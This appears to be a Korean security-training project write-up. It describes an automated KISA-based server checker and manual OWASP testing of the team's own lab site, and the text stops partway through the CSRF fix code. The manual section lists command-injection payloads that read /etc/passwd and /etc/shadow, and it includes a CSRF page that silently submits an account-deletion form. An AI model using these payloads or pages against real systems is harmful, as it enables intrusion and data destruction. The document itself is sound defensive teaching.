### 디렉토리 구조

```
diagnosis-system/
├── server_list.xml           # 진단 대상 서버 목록
├── cmd/
│   ├── os_cmd.xml           # OS 진단 명령어 (13개 항목)
│   ├── web_cmd.xml          # 웹 서버 진단 명령어 (14개 항목)
│   └── db_cmd.xml           # DB 진단 명령어 (13개 항목)
├── scripts/
│   ├── main.py              # 메인 실행 스크립트
│   ├── ssh_connector.py     # SSH 연결 모듈
│   ├── command_executor.py  # 명령어 실행 모듈
│   └── report_generator.py  # 리포트 생성 모듈
└── reports/
    ├── os_report.md
    ├── web_report.md
    ├── db_report.md
    └── total_report.md      # 종합 보고서
```

### server_list.xml - 서버 관리

**발표 내용**:
> "진단 디렉토리는요, 저희는 **server_list.xml에 가지고 어떤 서버를 추가할 수 있는 수정성을 염두**에 둬서
> 서버를 추가할 수 있도록 요렇게 xml 파일을 구성을 해놨고요."

**server_list.xml 예시**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<servers>
    <server>
        <id>academy-server-01</id>
        <name>Academy Main Server</name>
        <ip>52.79.xxx.xxx</ip>
        <port>22</port>
        <username>ubuntu</username>
        <key_path>/home/user/.ssh/academy-key.pem</key_path>
        <os>ubuntu</os>
        <web_server>nginx</web_server>
        <was>tomcat</was>
        <db>mariadb</db>
    </server>

    <!-- 추가 서버는 여기에 계속 추가 가능 -->
    <server>
        <id>academy-server-02</id>
        <name>Academy Backup Server</name>
        <ip>13.125.xxx.xxx</ip>
        <port>22</port>
        <username>ubuntu</username>
        <key_path>/home/user/.ssh/academy-key.pem</key_path>
        <os>ubuntu</os>
        <web_server>nginx</web_server>
        <was>tomcat</was>
        <db>mariadb</db>
    </server>
</servers>
```

**확장성의 장점**:
```python
# ssh_connector.py
import xml.etree.ElementTree as ET
import paramiko

class ServerManager:
    def __init__(self, xml_path="server_list.xml"):
        self.xml_path = xml_path
        self.servers = self.load_servers()

    def load_servers(self):
        """XML에서 서버 목록 로드"""
        tree = ET.parse(self.xml_path)
        root = tree.getroot()

        servers = []
        for server in root.findall('server'):
            server_info = {
                'id': server.find('id').text,
                'name': server.find('name').text,
                'ip': server.find('ip').text,
                'port': int(server.find('port').text),
                'username': server.find('username').text,
                'key_path': server.find('key_path').text,
                'os': server.find('os').text,
                'web_server': server.find('web_server').text,
                'was': server.find('was').text,
                'db': server.find('db').text
            }
            servers.append(server_info)

        return servers

    def connect(self, server_id):
        """특정 서버에 SSH 연결"""
        server = next((s for s in self.servers if s['id'] == server_id), None)
        if not server:
            raise ValueError(f"Server {server_id} not found")

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        key = paramiko.RSAKey.from_private_key_file(server['key_path'])
        ssh.connect(
            hostname=server['ip'],
            port=server['port'],
            username=server['username'],
            pkey=key
        )

        return ssh, server
```

### cmd XML 파일 구조

**발표 내용**:
> "그리고 **os 13개 그리고 웹 14개 db 13개 구성**으로 **cmd.xml 파일로 보안을 점검하고**
> 그 **명령어와 취약 양호 판단 기준**을 정해 할 수 있도록 요렇게 파일들을 구성을 해놨습니다."

**os_cmd.xml 예시**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<os_checks>
    <!-- U-01: root 계정 원격 접속 제한 -->
    <check>
        <id>U-01</id>
        <title>root 계정 원격 접속 제한</title>
        <category>계정관리</category>
        <risk_level>상</risk_level>
        <command>cat /etc/ssh/sshd_config | grep "^PermitRootLogin"</command>
        <good_pattern>PermitRootLogin no</good_pattern>
        <bad_pattern>PermitRootLogin yes</bad_pattern>
        <description>root 계정의 원격 접속이 허용되어 있는지 확인</description>
        <solution>
            /etc/ssh/sshd_config 파일에서 PermitRootLogin을 no로 설정
            systemctl restart sshd
        </solution>
    </check>

    <!-- U-02: 패스워드 복잡성 설정 -->
    <check>
        <id>U-02</id>
        <title>패스워드 복잡성 설정</title>
        <category>계정관리</category>
        <risk_level>상</risk_level>
        <command>cat /etc/pam.d/common-password | grep "pam_pwquality.so"</command>
        <good_pattern>minlen=8</good_pattern>
        <bad_pattern></bad_pattern>
        <description>패스워드 최소 길이 및 복잡도 정책 확인</description>
        <solution>
            /etc/pam.d/common-password에 다음 추가:
            password requisite pam_pwquality.so retry=3 minlen=8 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1
        </solution>
    </check>

    <!-- U-03: 계정 잠금 임계값 설정 -->
    <check>
        <id>U-03</id>
        <title>계정 잠금 임계값 설정</title>
        <category>계정관리</category>
        <risk_level>중</risk_level>
        <command>cat /etc/pam.d/common-auth | grep "pam_tally2"</command>
        <good_pattern>deny=5</good_pattern>
        <bad_pattern></bad_pattern>
        <description>로그인 실패 시 계정 잠금 설정 확인</description>
        <solution>
            /etc/pam.d/common-auth에 다음 추가:
            auth required pam_tally2.so deny=5 unlock_time=120
        </solution>
    </check>

    <!-- ... 나머지 10개 항목 ... -->
</os_checks>
```

**web_cmd.xml 예시**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<web_checks>
    <!-- W-01: 웹 서버 버전 정보 노출 -->
    <check>
        <id>W-01</id>
        <title>웹 서버 버전 정보 노출</title>
        <category>정보노출</category>
        <risk_level>중</risk_level>
        <command>cat /etc/nginx/nginx.conf | grep "server_tokens"</command>
        <good_pattern>server_tokens off</good_pattern>
        <bad_pattern>server_tokens on</bad_pattern>
        <description>Nginx 버전 정보 노출 여부 확인</description>
        <solution>
            /etc/nginx/nginx.conf에서 server_tokens off; 설정
        </solution>
    </check>

    <!-- W-02: 디렉토리 리스팅 차단 -->
    <check>
        <id>W-02</id>
        <title>디렉토리 리스팅 차단</title>
        <category>정보노출</category>
        <risk_level>중</risk_level>
        <command>cat /etc/nginx/sites-available/default | grep "autoindex"</command>
        <good_pattern>autoindex off</good_pattern>
        <bad_pattern>autoindex on</bad_pattern>
        <description>디렉토리 내용 자동 나열 방지</description>
        <solution>
            location 블록에 autoindex off; 설정
        </solution>
    </check>

    <!-- ... 나머지 12개 항목 ... -->
</web_checks>
```

**db_cmd.xml 예시**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<db_checks>
    <!-- D-01: DB 원격 접속 제한 -->
    <check>
        <id>D-01</id>
        <title>DB 원격 접속 제한</title>
        <category>접근통제</category>
        <risk_level>상</risk_level>
        <command>cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep "bind-address"</command>
        <good_pattern>bind-address = 127.0.0.1</good_pattern>
        <bad_pattern>bind-address = 0.0.0.0</bad_pattern>
        <description>외부에서 DB 직접 접근 차단 확인</description>
        <solution>
            /etc/mysql/mariadb.conf.d/50-server.cnf에서
            bind-address = 127.0.0.1 설정
        </solution>
    </check>

    <!-- D-02: root 계정 원격 접속 제한 -->
    <check>
        <id>D-02</id>
        <title>root 계정 원격 접속 제한</title>
        <category>계정관리</category>
        <risk_level>상</risk_level>
        <command><![CDATA[
            mysql -e "SELECT Host, User FROM mysql.user WHERE User='root';"
        ]]></command>
        <good_pattern>localhost</good_pattern>
        <bad_pattern>%</bad_pattern>
        <description>root 계정의 원격 접속 허용 여부</description>
        <solution>
            mysql> DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
            mysql> FLUSH PRIVILEGES;
        </solution>
    </check>

    <!-- ... 나머지 11개 항목 ... -->
</db_checks>
```

### 명령어 실행 및 판단 로직

```python
# command_executor.py
import xml.etree.ElementTree as ET
import re

class CommandExecutor:
    def __init__(self, ssh_connection):
        self.ssh = ssh_connection

    def execute_checks(self, xml_path, category):
        """XML 파일을 읽어 진단 수행"""
        tree = ET.parse(xml_path)
        root = tree.getroot()

        results = []

        for check in root.findall('check'):
            check_id = check.find('id').text
            title = check.find('title').text
            command = check.find('command').text
            good_pattern = check.find('good_pattern').text
            bad_pattern = check.find('bad_pattern').text
            risk_level = check.find('risk_level').text
            solution = check.find('solution').text

            # SSH로 명령어 실행
            stdin, stdout, stderr = self.ssh.exec_command(command)
            output = stdout.read().decode('utf-8')
            error = stderr.read().decode('utf-8')

            # 결과 판단
            status = self.judge_result(output, good_pattern, bad_pattern)

            result = {
                'id': check_id,
                'title': title,
                'category': category,
                'risk_level': risk_level,
                'status': status,
                'output': output,
                'error': error,
                'solution': solution
            }

            results.append(result)

            # 실시간 출력 (색상 표시)
            status_color = '\033[92m' if status == '양호' else '\033[91m'
            print(f"{status_color}[{status}]\033[0m {check_id} - {title}")

        return results

    def judge_result(self, output, good_pattern, bad_pattern):
        """출력 결과를 분석하여 양호/취약 판단"""
        if good_pattern and re.search(good_pattern, output):
            return '양호'
        elif bad_pattern and re.search(bad_pattern, output):
            return '취약'
        else:
            return '검토필요'
```

---

## 📋 2.1.6 자동 진단 시스템 (KISA 가이드 40개 항목)

### 진단 항목 구성

**발표 내용**:
> "저희는 **KISA 진단 항목 기준으로 분류**를 해봤습니다.
> 보니까 **위험 33.3%** 그리고 **보통 45.8%** **양호 20.8%** 이 비중을 가지게 되었습니다."

### 진단 결과 통계

| 분류 | 항목 수 | 취약 | 양호 | 취약률 |
|:---:|:---:|:---:|:---:|:---:|
| **OS (Ubuntu)** | 13개 | 8개 | 5개 | 61.5% |
| **Web (Nginx)** | 14개 | 10개 | 4개 | 71.4% |
| **DB (MariaDB)** | 13개 | 6개 | 7개 | 46.2% |
| **합계** | **40개** | **24개** | **16개** | **60.0%** |

### 위험 수준별 분류

| 위험 수준 | 항목 수 | 비율 |
|:---:|:---:|:---:|
| **위험 (상)** | 8개 | 33.3% |
| **보통 (중)** | 11개 | 45.8% |
| **낮음 (하)** | 5개 | 20.8% |

### 대표 취약점 3가지

**발표 내용**:
> "취약점 진단 중에 **가장 대표적인 위험 3요소**를 먼저 가져왔습니다.
> 네 **섀도우 파일 권한 설정 취약점** **톰캣 매니저 앱 확인** **암호화 연결 설정 확인** 요 세 가지가 취약하고
> 가장 대표적인 예라서 요 세 가지를 PPT에 실게 되었습니다."

#### 1. 섀도우 파일 권한 설정 취약점 (U-44)

**위험도**: 상
**카테고리**: 파일 및 디렉토리 관리

**진단 명령어**:
```bash
ls -l /etc/shadow
```

**취약한 출력**:
```
-rw-r----- 1 root shadow 1234 Jan  5 10:00 /etc/shadow
```

**문제점**:
- 권한이 `640`으로 설정됨
- shadow 그룹에 속한 사용자가 읽을 수 있음
- 암호화된 비밀번호 해시가 유출될 위험

**양호한 설정**:
```bash
# 권한을 400으로 변경
sudo chmod 400 /etc/shadow

# 결과 확인
ls -l /etc/shadow
-r-------- 1 root root 1234 Jan  5 10:00 /etc/shadow
```

**자동 진단 스크립트**:
```python
def check_shadow_permission(ssh):
    """섀도우 파일 권한 확인"""
    command = "stat -c '%a %U %G' /etc/shadow"
    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode('utf-8').strip()

    permission, owner, group = output.split()

    # 양호: 400 이하, root 소유
    if permission == '400' and owner == 'root' and group == 'root':
        return {
            'status': '양호',
            'detail': f'/etc/shadow 권한: {permission}, 소유자: {owner}:{group}',
            'solution': None
        }
    else:
        return {
            'status': '취약',
            'detail': f'/etc/shadow 권한: {permission}, 소유자: {owner}:{group}',
            'solution': 'sudo chmod 400 /etc/shadow\nsudo chown root:root /etc/shadow'
        }
```

#### 2. 톰캣 매니저 앱 확인 (W-07)

**위험도**: 상
**카테고리**: 불필요한 서비스 차단

**진단 내용**:
- Tomcat Manager 애플리케이션이 배포되어 있는지 확인
- Manager를 통해 WAR 파일 업로드 및 애플리케이션 관리 가능
- 공격자가 악의적인 WAR 파일을 업로드할 수 있음

**진단 명령어**:
```bash
ls -la /opt/tomcat/webapps/ | grep -E "manager|host-manager"
```

**취약한 출력**:
```
drwxr-x--- 3 tomcat tomcat 4096 Jan  5 10:00 manager
drwxr-x--- 3 tomcat tomcat 4096 Jan  5 10:00 host-manager
```

**양호한 조치**:
```bash
# Manager 애플리케이션 제거
sudo rm -rf /opt/tomcat/webapps/manager
sudo rm -rf /opt/tomcat/webapps/host-manager

# Tomcat 재시작
sudo systemctl restart tomcat
```

**자동 진단 스크립트**:
```python
def check_tomcat_manager(ssh):
    """Tomcat Manager 앱 존재 확인"""
    command = "ls -la /opt/tomcat/webapps/ | grep -E 'manager|host-manager'"
    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode('utf-8').strip()

    if output:
        return {
            'status': '취약',
            'detail': f'Tomcat Manager 앱이 존재합니다:\n{output}',
            'solution': '''sudo rm -rf /opt/tomcat/webapps/manager
sudo rm -rf /opt/tomcat/webapps/host-manager
sudo systemctl restart tomcat'''
        }
    else:
        return {
            'status': '양호',
            'detail': 'Tomcat Manager 앱이 제거되어 있습니다.',
            'solution': None
        }
```

#### 3. 암호화 연결 설정 확인 (D-08)

**위험도**: 상
**카테고리**: 암호화

**진단 내용**:
- DB 연결 시 SSL/TLS 암호화 사용 여부
- 평문으로 전송되는 DB 트래픽 스니핑 가능

**진단 명령어**:
```bash
mysql -e "SHOW VARIABLES LIKE 'have_ssl';"
```

**취약한 출력**:
```
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| have_ssl      | NO    |
+---------------+-------+
```

**양호한 설정**:
```bash
# 1. SSL 인증서 생성
sudo mysql_ssl_rsa_setup

# 2. MariaDB 설정 파일 수정
sudo vi /etc/mysql/mariadb.conf.d/50-server.cnf

[mysqld]
ssl-ca=/var/lib/mysql/ca.pem
ssl-cert=/var/lib/mysql/server-cert.pem
ssl-key=/var/lib/mysql/server-key.pem
require_secure_transport=ON

# 3. MariaDB 재시작
sudo systemctl restart mariadb

# 4. 확인
mysql -e "SHOW VARIABLES LIKE 'have_ssl';"
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| have_ssl      | YES   |
+---------------+-------+
```

**자동 진단 스크립트**:
```python
def check_mysql_ssl(ssh):
    """MySQL/MariaDB SSL 설정 확인"""
    command = "mysql -e \"SHOW VARIABLES LIKE 'have_ssl';\""
    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode('utf-8')

    if 'YES' in output or 'DISABLED' in output:
        return {
            'status': '양호',
            'detail': 'SSL이 활성화되어 있습니다.',
            'solution': None
        }
    else:
        return {
            'status': '취약',
            'detail': 'SSL이 비활성화되어 있습니다.',
            'solution': '''sudo mysql_ssl_rsa_setup
sudo vi /etc/mysql/mariadb.conf.d/50-server.cnf
# [mysqld] 섹션에 다음 추가:
# ssl-ca=/var/lib/mysql/ca.pem
# ssl-cert=/var/lib/mysql/server-cert.pem
# ssl-key=/var/lib/mysql/server-key.pem
# require_secure_transport=ON
sudo systemctl restart mariadb'''
        }
```

### 자동 진단 시연 영상

**발표 내용**:
> "다음은 저희 자동진단 시스템 시연 영상입니다.
> 저희는 **전체 진단하고 카테고리별 진단 특정 서버 지정 등 다양한 옵션**을 제공을 합니다."

**진단 옵션**:
1. **전체 진단**: OS + Web + DB 40개 항목 모두 점검
2. **카테고리별 진단**: OS만, Web만, DB만 선택 점검
3. **특정 서버 지정**: server_list.xml에서 원하는 서버만 선택

**실행 화면**:
```
$ python main.py

===== 취약점 자동 진단 시스템 =====
1. 전체 진단 (OS + Web + DB)
2. OS 진단만
3. Web 진단만
4. DB 진단만
5. 서버 선택
0. 종료
===================================
선택:
```

**진단 실행 화면**:
> "원격 진단을 이렇게 실행하게 되면 **KISA 가이드 기반 40개 항목을 자동으로 다 점검**을 합니다.
> **빨간색은 취약함** 그리고 **초록색은 양호함** 이라고 표시를 직관적으로 표시를 해놨습니다."

```
진단 대상 서버: academy-server-01 (52.79.xxx.xxx)
SSH 연결 중...
연결 성공!

[OS 진단 시작]
[양호] U-01 - root 계정 원격 접속 제한
[취약] U-02 - 패스워드 복잡성 설정
[취약] U-03 - 계정 잠금 임계값 설정
[양호] U-04 - 패스워드 파일 보호
[취약] U-44 - 섀도우 파일 권한 설정
...

[Web 진단 시작]
[취약] W-01 - 웹 서버 버전 정보 노출
[취약] W-02 - 디렉토리 리스팅 차단
[양호] W-03 - 불필요한 파일 제거
[취약] W-07 - Tomcat Manager 앱 확인
...

[DB 진단 시작]
[양호] D-01 - DB 원격 접속 제한
[양호] D-02 - root 계정 원격 접속 제한
[취약] D-08 - 암호화 연결 설정 확인
...

진단 완료!
총 40개 항목 중 24개 취약, 16개 양호
취약률: 60.0%

리포트 생성 중...
리포트 저장 완료: reports/total_report.md
```

### 마크다운 리포트 자동 생성

**발표 내용**:
> "그리고 요걸 가지고 **진단 결과를 자동으로 생성하고 처리할 수 있도록**
> 이런 식으로 **마크다운 리포트까지 만들 수 있게** 자동으로 할 수 있는 이런 구성을 만들어놨고요."

**리포트 생성 스크립트**:
```python
# report_generator.py
from datetime import datetime

class ReportGenerator:
    def __init__(self, results):
        self.results = results
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def generate_markdown(self, output_path):
        """마크다운 형식의 리포트 생성"""
        with open(output_path, 'w', encoding='utf-8') as f:
            # 헤더
            f.write(f"# 취약점 진단 보고서\n\n")
            f.write(f"**진단 일시**: {self.timestamp}\n\n")
            f.write(f"---\n\n")

            # 요약
            f.write("## 📊 진단 결과 요약\n\n")
            total = len(self.results)
            vulnerable = sum(1 for r in self.results if r['status'] == '취약')
            good = sum(1 for r in self.results if r['status'] == '양호')

            f.write(f"- **총 진단 항목**: {total}개\n")
            f.write(f"- **취약**: {vulnerable}개 ({vulnerable/total*100:.1f}%)\n")
            f.write(f"- **양호**: {good}개 ({good/total*100:.1f}%)\n\n")

            # 카테고리별 통계
            f.write("### 카테고리별 통계\n\n")
            f.write("| 카테고리 | 총 항목 | 취약 | 양호 | 취약률 |\n")
            f.write("|:---:|:---:|:---:|:---:|:---:|\n")

            categories = {}
            for r in self.results:
                cat = r['category']
                if cat not in categories:
                    categories[cat] = {'total': 0, 'vulnerable': 0, 'good': 0}
                categories[cat]['total'] += 1
                if r['status'] == '취약':
                    categories[cat]['vulnerable'] += 1
                else:
                    categories[cat]['good'] += 1

            for cat, stats in categories.items():
                rate = stats['vulnerable'] / stats['total'] * 100
                f.write(f"| {cat} | {stats['total']} | {stats['vulnerable']} | {stats['good']} | {rate:.1f}% |\n")

            f.write("\n---\n\n")

            # 상세 결과
            f.write("## 🔍 상세 진단 결과\n\n")

            for r in self.results:
                status_emoji = "❌" if r['status'] == '취약' else "✅"
                f.write(f"### {status_emoji} {r['id']} - {r['title']}\n\n")
                f.write(f"**상태**: {r['status']}\n\n")
                f.write(f"**위험도**: {r['risk_level']}\n\n")
                f.write(f"**카테고리**: {r['category']}\n\n")

                if r['status'] == '취약' and r['solution']:
                    f.write(f"**조치 방법**:\n```bash\n{r['solution']}\n```\n\n")

                f.write("---\n\n")
```

**생성된 리포트 예시** (total_report.md):
```markdown
# 취약점 진단 보고서

**진단 일시**: 2026-01-05 14:30:00
**진단 대상**: academy-server-01 (52.79.xxx.xxx)
**OS**: Ubuntu 20.04 LTS
**Web Server**: Nginx 1.18.0
**WAS**: Tomcat 9.0
**DB**: MariaDB 10.3

---

## 📊 진단 결과 요약

- **총 진단 항목**: 40개
- **취약**: 24개 (60.0%)
- **양호**: 16개 (40.0%)

### 카테고리별 통계

| 카테고리 | 총 항목 | 취약 | 양호 | 취약률 |
|:---:|:---:|:---:|:---:|:---:|
| OS | 13 | 8 | 5 | 61.5% |
| Web | 14 | 10 | 4 | 71.4% |
| DB | 13 | 6 | 7 | 46.2% |

---

## 🔍 상세 진단 결과

### ❌ U-01 - root 계정 원격 접속 제한

**상태**: 취약

**위험도**: 상

**카테고리**: 계정관리

**조치 방법**:
```bash
sudo vi /etc/ssh/sshd_config
# PermitRootLogin no 로 변경
sudo systemctl restart sshd
```

---

### ✅ U-04 - 패스워드 파일 보호

**상태**: 양호

**위험도**: 상

**카테고리**: 파일 및 디렉토리 관리

---

... (계속)
```

---

계속해서 Section 2의 나머지 부분(수동 진단, 질의응답 등)을 작성하겠습니다.
## 🛠️ 2.1.7 수동 취약점 진단 (OWASP Top 10 기반)

### 수동 진단 가이드북

**발표 내용**:
> "수동 취약점 진단 실습 같은 경우는 저희가 **따로 팀원끼리 다 같이 하려고 일부러 가이드북을 만든** 건데요.
> 네 이 가이드북 이미지로 실었구요."

**진단 기준**:
> "이거는 저희 수동진단은 **OWASP Top 10 취약점 진단 기준**을 가지고 진행을 했습니다.
> 저희가 8개를 했는데요. 여기서 좀 KISA 기준 중에 좀 취약점이 좀 **취약한 위험한 위험 요소**들을 갖고 있는 것들 위주로 먼저 설명을 해드리겠습니다."

### 수동 진단 항목 목록

10조가 수행한 수동 진단 항목:

| 번호 | 취약점 | OWASP 분류 | 위험도 |
|:---:|:---|:---|:---:|
| 1 | Command Injection | A03: Injection | 상 |
| 2 | CSRF (Cross-Site Request Forgery) | A01: Broken Access Control | 상 |
| 3 | Path Traversal | A01: Broken Access Control | 상 |
| 4 | SQL Injection | A03: Injection | 상 |
| 5 | SSRF (Server-Side Request Forgery) | A10: SSRF | 상 |
| 6 | Stored XSS | A03: Injection | 중 |
| 7 | 권한 검증 미흡 | A01: Broken Access Control | 상 |
| 8 | 민감정보 노출 (평문 비밀번호) | A02: Cryptographic Failures | 상 |

**칼리 리눅스 도구 활용**:
- Nmap (포트 스캔)
- Nuclei (취약점 스캔)
- SQLMap (SQL Injection 자동화)

### 1. Command Injection (명령어 주입)

#### 취약점 위치
- 페이지: `/admin/server-status.jsp`
- 기능: 서버 상태 확인 (Ping)

#### 공격 시나리오

**발표 내용**:
> "첫번째로 **커맨드 인젝션** 인데요. 아까 말씀드렸던 관리자 마이 페이지 들어가면 **서버 상태 확인하는 버튼**이 있다고 했잖아요.
> 여기 들어오면 이 화면이 보입니다. 여기서 **입력값 조작으로 시스템 명령을 실행**하는 건데요."

**공격 단계**:

**Step 1**: 관리자 계정으로 로그인
```
Username: admin
Password: admin1234
```

**Step 2**: 마이페이지 → 서버 관리 메뉴 접근

**Step 3**: IP 주소 입력 창에 페이로드 삽입
```
입력값: 8.8.8.8; cat /etc/passwd
```

**Step 4**: 실행 결과 확인

**발표 내용**:
> "그 뒤에 **8.8.8 뒤에 세미콜론 값 캣 넣고** 다음에 **패스워드** 요거까지 하면 **파일을 탈취할 수 있는 요 정보들이**
> 원래는 필터링이 돼서 보이면 안 되는데 **보여지는 이런 취약점**이 있다라는 걸 확인했구요."

**실행 결과**:
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=2.35 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=2.41 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=2.38 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=117 time=2.42 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 2.348/2.390/2.420/0.027 ms

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

#### 다양한 Command Injection 페이로드

```bash
# 기본 명령어 체이닝
8.8.8.8; ls -la /

# 파이프 사용
8.8.8.8 | whoami

# AND 연산자
8.8.8.8 && cat /etc/shadow

# OR 연산자
8.8.8.8 || cat /etc/hosts

# 백틱 사용
8.8.8.8`whoami`

# 명령어 치환
8.8.8.8$(cat /etc/passwd)

# 리다이렉션
8.8.8.8; cat /etc/passwd > /tmp/leaked.txt
```

#### 수동 진단 가이드북 내용

**진단 절차**:
1. 관리자 계정으로 로그인
2. 서버 관리 페이지 접근
3. 정상 IP 주소로 ping 테스트 (8.8.8.8)
4. Command Injection 페이로드 삽입
5. 시스템 파일 조회 시도
6. 취약점 존재 여부 확인

**확인 사항**:
- [ ] `/etc/passwd` 파일 내용이 화면에 출력되는가?
- [ ] 다른 시스템 명령어 실행이 가능한가?
- [ ] 에러 메시지가 필터링 없이 노출되는가?

**보안 조치**:
```java
// 안전한 코드
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String ipAddress = request.getParameter("ip");

    // ✅ IP 주소 형식 검증
    String ipPattern = "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}" +
                       "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";

    if (!ipAddress.matches(ipPattern)) {
        request.setAttribute("error", "올바른 IP 주소 형식이 아닙니다.");
        request.getRequestDispatcher("error.jsp").forward(request, response);
        return;
    }

    // ✅ 화이트리스트 기반 명령어 실행
    List<String> command = Arrays.asList("ping", "-c", "4", ipAddress);

    try {
        ProcessBuilder pb = new ProcessBuilder(command);
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );

        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }

        request.setAttribute("result", output.toString());
        request.getRequestDispatcher("server-status.jsp").forward(request, response);

    } catch (IOException e) {
        // ✅ 에러 메시지 필터링
        request.setAttribute("error", "서버 상태 확인 중 오류가 발생했습니다.");
        request.getRequestDispatcher("error.jsp").forward(request, response);
    }
}
```

---

### 2. CSRF (Cross-Site Request Forgery)

#### 취약점 개념

**발표 내용**:
> "**CSRF**. 네 요거는 **세션을 악용**을 해가지고 **사용자 모르게 요청을 수행**하는 그런 취약점입니다."

#### 공격 시나리오

**공격자의 목표**: 로그인한 사용자의 세션을 이용하여 사용자 모르게 회원 탈퇴 수행

**Step 1**: 공격자가 악의적인 웹 페이지 작성

```html
<!-- attacker.html -->
<!DOCTYPE html>
<html>
<head>
    <title>무료 쿠폰 받기!</title>
</head>
<body>
    <h1>🎁 축하합니다! 무료 상품권에 당첨되었습니다!</h1>
    <p>상품권을 받으려면 아래 버튼을 클릭하세요.</p>

    <!-- 숨겨진 폼: 사용자 모르게 회원 탈퇴 요청 -->
    <form id="csrf-form"
          action="http://academy.example.com/deleteUser"
          method="POST"
          style="display:none;">
        <input type="hidden" name="user_id" value="전소원">
        <input type="hidden" name="confirm" value="yes">
    </form>

    <button onclick="document.getElementById('csrf-form').submit();">
        상품권 받기
    </button>

    <!-- 또는 자동 실행 -->
    <script>
        // 페이지 로드 시 자동으로 폼 제출
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
</body>
</html>
```

**Step 2**: 피해자가 academy 사이트에 로그인한 상태에서 공격자의 페이지 방문

**Step 3**: 피해자의 브라우저에 저장된 세션 쿠키가 자동으로 함께 전송됨

**Step 4**: 서버는 정상적인 요청으로 인식하여 처리

**발표 내용**:
> "요것도 팀원끼리 다 확인했구요. 요런 식으로 하면 **DB에서 전소원님 정보가 삭제가 되는** 요런 곳까지 확인을 했습니다."

#### 취약한 코드

```java
// DeleteUserServlet.java (취약한 코드)
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    HttpSession session = request.getSession();
    String loggedInUser = (String) session.getAttribute("username");

    String userIdToDelete = request.getParameter("user_id");
    String confirm = request.getParameter("confirm");

    // ⚠️ CSRF 토큰 검증 없음
    if ("yes".equals(confirm)) {
        String sql = "DELETE FROM users WHERE username = ?";

        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, userIdToDelete);
            int rows = pstmt.executeUpdate();

            if (rows > 0) {
                response.sendRedirect("success.jsp?msg=deleted");
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
}
```

#### 수동 진단 절차

1. **준비**: 두 개의 브라우저 또는 두 명의 팀원
2. **피해자 역할**: academy 사이트에 로그인
3. **공격자 역할**: 악의적인 HTML 페이지 생성 및 호스팅
4. **공격 실행**: 피해자가 공격자의 페이지 방문
5. **결과 확인**: DB에서 사용자 정보 삭제 여부 확인

```sql
-- 삭제 전
SELECT * FROM users WHERE username = '전소원';
+----+----------+---------------------+-----------+------+
| id | username | email               | password  | role |
+----+----------+---------------------+-----------+------+
|  5 | 전소원    | jeon@example.com    | pass1234  | user |
+----+----------+---------------------+-----------+------+

-- 공격 실행 후
SELECT * FROM users WHERE username = '전소원';
Empty set (0.00 sec)
```

#### 방어 방법

**방법 1: CSRF 토큰 사용 (권장)**

```java
// LoginServlet.java - 로그인 시 CSRF 토큰 생성
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    // ... 로그인 처리 ...

    if (loginSuccess) {
        HttpSession session = request.getSession();
        session.setAttribute("username", username);
        session.setAttribute("role", role);

        // ✅ CSRF 토큰 생성
        String csrfToken = generateCSRFToken();
        session.setAttribute("csrf_token", csrfToken);

        response.sendRedirect("index.jsp");
    }
}

private String generateCSRFToken() {
    return UUID.randomUUID().toString();
}
```

```jsp
<!-- 안전한 폼 -->
<form action="deleteUser" method="POST">
    <!-- ✅ CSRF 토큰 포함 -->
    <input type="hidden" name="csrf_token" value="${sessionScope.csrf_token}">
    <input type="hidden" name="user_id" value="${sessionScope.username}">

    <p>정말로 회원 탈퇴하시겠습니까?</p>
    <button type="submit">탈퇴하기</button>
</form>
```

```java
// DeleteUserServlet.java - 안전한 코드
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    HttpSession session = request.getSession();

    // ✅ CSRF 토큰 검증
    String sessionToken = (String) session.getAttribute("csrf_token");
    String requestToken = request.getParameter("csrf_token");

    if (sessionToken == null || !sessionToken.equals(requestToken)) {
        response.sendError(HttpServletResponse.SC_FORBIDDEN,
            "CSRF token validation failed");
        return;
    }

    // 정상 처리
    String userIdToDelete = request.getParameter("user_id");
    String loggedInUser = (String) session.getAttribute("username");

    // ✅ 본인만 탈퇴 가능
    if (!userIdToDelete.equals(loggedInUser)) {
        response.sendError(HttpServletResponse.SC_FORBIDDEN,
